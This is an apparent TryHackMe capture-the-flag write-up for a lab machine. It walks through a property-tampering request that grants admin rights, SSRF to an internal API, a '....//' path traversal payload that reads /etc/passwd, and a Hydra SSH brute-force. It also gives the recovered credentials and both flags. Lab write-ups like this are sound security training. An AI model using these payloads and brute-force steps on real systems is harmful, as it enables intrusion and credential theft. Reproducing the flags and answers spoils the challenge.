
Platform: TryHackMe
**Target:** `10.114.138.85`  
**Difficulty:** Medium  


> This write-up documents an authorized TryHackMe CTF. The target IP may change when the machine restarts; replace it with the current IP when running the commands.

## Summary

The attack chain involved two web applications. On port 4000, the Review App allowed me to change user profile properties through its activity recommendation feature. I changed `isAdmin` to gain access to the admin pages, then used a URL field in Admin Settings to make a server-side request to an internal API. The API response was Base64-encoded and contained the SysMon credentials.

After finding the first flag on the SysMon dashboard, I tested the `img` parameter in `profile.php` and confirmed a local file inclusion/path traversal vulnerability. I read `/etc/passwd`, identified system users, obtained SSH access, and read the hidden text file in the web root.

**Techniques:** BOPLA, SSRF, LFI/path traversal, SSH password brute-force

## 1. Reconnaissance

I began by scanning the target with Nmap:

```bash
nmap -sC -sV -Pn -T4 10.114.138.85 -oN nmap.txt
```

Key services:

- `22/tcp` — OpenSSH
    
- `25/tcp` — SMTP
    
- `110/tcp`, `143/tcp`, `993/tcp`, `995/tcp` — POP3/IMAP
    
- `4000/tcp` — Node.js / Express Review App
    
- `50000/tcp` — Apache-hosted System Monitoring Portal (SysMon)
    

> ![[nmap.png]]

## 2. Logging in to the Review App

The sign-in page on port 4000 displayed the credentials `guest/guest`. After logging in, I opened **My Profile**, which led to `/friend/1`.

The profile displayed fields such as `id`, `name`, `age`, `country`, `albums`, `isAdmin`, and `profileImage`. The initial value of `isAdmin` was `false`. The same page contained a **Recommend an Activity** form.

> ![[4000 signin.png]]

![[Ekran Resmi 2026-10-31 13.28.23.png]]
## 3. Gaining admin access with BOPLA

When I submitted an activity recommendation, Burp showed that the request was sent to:

```http
POST /recommend-activity/1
```

The request body contained these fields:

```text
activityType=fav+book&activityName=1998
```

To check whether `activityType` was being used as a profile property name, I changed the body to:

```text
activityType=isAdmin&activityName=true
```

After refreshing the profile, `isAdmin` was set to `true`, and admin links became visible. The application accepted a user-controlled property name and wrote it to the profile without sufficient authorization checks. This is a **Broken Object Property Level Authorization (BOPLA)** vulnerability.

> ![[Ekran Resmi 2026-10-31 13.36.54.png]]

![[Ekran Resmi 2026-10-31 14.09.45.png]]
## 4. Exploring the admin pages and exploiting SSRF

The admin menu linked to `/admin/api`. This page documented internal APIs running on `127.0.0.1:5000`. The endpoint that stood out was:

```text
http://127.0.0.1:5000/getAllAdmins101099991
```

The `/admin/settings` page contained an **Update Banner Image URL** field. I entered the internal API URL and submitted it. The server fetched the URL and displayed the response as Base64 data, revealing a **Server-Side Request Forgery (SSRF)** vulnerability.

I decoded the Base64 response:

```bash
echo 'PASTE_BASE64_VALUE_HERE' | base64 -d
```

The response contained these SysMon credentials:

```text
Username: administrator
Password: S$9$qk6d#**LQU
```

>![[Ekran Resmi 2026-10-31 13.41.55.png]]

## 5. Logging in to SysMon and finding the first flag

I opened the SysMon login page on port 50000 and used the credentials I had recovered:

```text
administrator / S$9$qk6d#**LQU
```

The first flag was displayed on the dashboard:

```
First flag: THM{!50_55Rf_1S_d_k3Y??!}
```

> ![[Ekran Resmi 2026-10-31 13.43.16.png]]

## 6. LFI in `profile.php`

Gobuster had identified the `profile.php` endpoint. After logging in to SysMon, I captured the profile image request sent when the dashboard loaded:

```http
GET /profile.php?img=profile.png
```

Because the `img` parameter accepted a filename, I tested whether it could access local files. The application filtered basic `../` traversal sequences, so I used repeated `....//` sequences to bypass the filter:

```text
....//....//....//....//....//....//....//....//....//....//etc/passwd
```

The resulting URL was:

```text
http://10.114.138.85:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//etc/passwd
```

The response contained the contents of `/etc/passwd`, confirming an **LFI/path traversal** vulnerability. I identified `joshua` and `charles` as users with interactive shells.

> ![[Ekran Resmi 2026-10-31 14.02.38.png]]

## 7. SSH access and the second flag

I added `joshua` and `charles` to a `users.txt` file:

```text
joshua
charles
```

Then I used Hydra with a common password list against SSH:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.114.138.85 -t 4
```

Hydra returned these credentials:

```text
joshua : 123456
charles : 123456
```

I connected over SSH as `joshua`:

```bash
ssh joshua@10.114.138.85
```

I searched for text files in the web root:

```bash
find /var/www/html -maxdepth 1 -type f -name '*.txt' -print
```

The file was:

```text
/var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

I read its contents:

```bash
cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

The second flag was:

```text
THM{505eb0fb8a9f32853b4d955e1f9123ea}
```

>![[Ekran Resmi 2026-10-31 14.05.55.png]]

## Conclusion

The attack chain linked several vulnerabilities:

1. I changed the `isAdmin` profile property through BOPLA in the Review App.
    
2. I used SSRF in Admin Settings to retrieve SysMon credentials from an internal API.
    
3. I found the first flag on the SysMon dashboard.
    
4. I read `/etc/passwd` through the LFI/path traversal vulnerability in `profile.php`.
    
5. I obtained SSH access and read the hidden text file under `/var/www/html`.
    

## Before publishing

- Hide `Cookie` headers in Burp screenshots.
    
- Use a dashboard screenshot where the complete first flag is visible.
    
- After adding the images to your Obsidian vault, replace the screenshot notes above with embeds such as `![[filename.png]]`.